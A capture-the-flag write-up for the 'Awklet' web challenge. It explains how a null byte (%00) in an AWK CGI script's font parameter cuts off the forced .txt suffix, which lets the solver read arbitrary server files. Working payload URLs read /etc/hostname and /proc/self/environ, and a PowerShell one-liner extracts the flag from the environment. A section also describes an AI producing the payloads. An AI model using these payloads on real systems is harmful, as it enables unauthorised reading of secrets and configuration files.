# Awklet / Null-Byte Injection File Read

**Category:** Web Exploitation (CGI / AWK)

## Overview

The Awklet challenge presented a seemingly harmless CGI-based ASCII-art generator. It allowed a user to specify a name and a font, and the backend would render stylized text using an AWK script. Beneath the surface, however, the script had a subtle vulnerability related to unsafe filename construction combined with null-byte decoding.

Because AWK (and the C standard library underneath) treats `\0` as a string terminator, it was possible to bypass the enforced `.txt` suffix and force the script to read arbitrary files on the server, including `/proc/self/environ`, which contains the flag as an environment variable.

This vulnerability is a classic example of null-byte injection, a well-known but still occasionally overlooked issue in file-handling logic.

## Understanding the Backend Logic

The AWK script responsible for generating ASCII art followed this simplified flow:

**Read query parameters:**

```
name=<input>
font=<font_name>
```

URL-decode %xx escape sequences, including %00.

**Build a filename:**

```
filename = font_name ".txt"
```

**Open the file:**

```
getline line < filename
```

Use the file contents as a "font" to render ASCII art.

**The central mistake:**

- The script accepted %00 in user input
- and treated it as a literal `\0` byte when decoding

When `\0` appears inside a filename, the C fopen() call used internally stops reading the string at the null byte.

Thus:

```
font=/flag%00
```

becomes:

```
filename="/flag\0.txt"
```

C's fopen() sees only:

```
"/flag"
```

The .txt portion is never reached.

## Initial Testing & Verification

My first test was to confirm that the exploit was working by reading a harmless file. Using the browser or PowerShell, I requested:

```
https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?name=%20&font=/etc/hostname%00
```

This returned:

```
Here's your /etc/hostname ascii art:
<container hostname>
<blank>
<blank>
...
```

Because the AWK ASCII renderer always prints 7 rows (one per "font line"), the output had the hostname on the first line followed by empty lines.

This proved:

- The null-byte bypass worked
- Arbitrary file read was happening
- The .txt extension had been effectively removed

## Extracting the Flag

The next logical step was to access the environment variables, where many CTF containers store their flags.

**Attempt:**

```
/proc/self/environ%00
```

**PowerShell version:**

```powershell
$raw = (Invoke-WebRequest 'https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?name=%20&font=/proc/self/environ%00').Content
($raw -split "`0") | Where-Object { $_ -match '(?i)\bflag=' }
```

**Explanation:**

- `/proc/self/environ` contains KEY=value pairs separated by null bytes
- Splitting on NUL reveals each variable cleanly
- Searching for "flag" locates the environment variable containing the challenge flag

This successfully produced a line like:

```
FLAG=bctf{...}
```

confirming the correct output.

## Why /flag Didn't Work Initially

Attempting to read `/flag%00` returned blank rows. This occurs when:

- The file doesn't exist
- Or doesn't contain printable characters
- Or AWK didn't populate the positions expected for ASCII glyphs

This is normal and indicates only that `/flag` was not the right path for this deployment. `/proc/self/environ` remains the more reliable source.

## How AI Assisted

AI provided crucial help at several stages:

### 1. Exploit Strategy Recognition

AI quickly identified this as a classic null-byte injection issue once the AWK script was inspected, explaining how %00 → `\0` affects filename resolution.

### 2. Constructing the Correct Payloads

AI produced precise URLs for testing `/etc/hostname`, `/flag`, and `/proc/self/environ`, ensuring the syntax and encoding were correct.

### 3. Handling NUL-separated Data

Environment files contain data separated by null bytes. AI provided PowerShell one-liners to properly split and search these entries, something that would be tricky for beginners.

### 4. Providing Practical Debugging Advice

When `/flag` didn't output anything, AI explained why and guided the pivot to `/proc/self/environ`, demonstrating proper methodology rather than trial-and-error.

## Flag

The environment variable contained the flag:

```
FLAG=bctf{...}
```

---

**Tools Used:** Browser, PowerShell, AWK knowledge, CGI debugging  
**Skills:** Null-byte injection, arbitrary file read, CGI exploitation, environment variable extraction
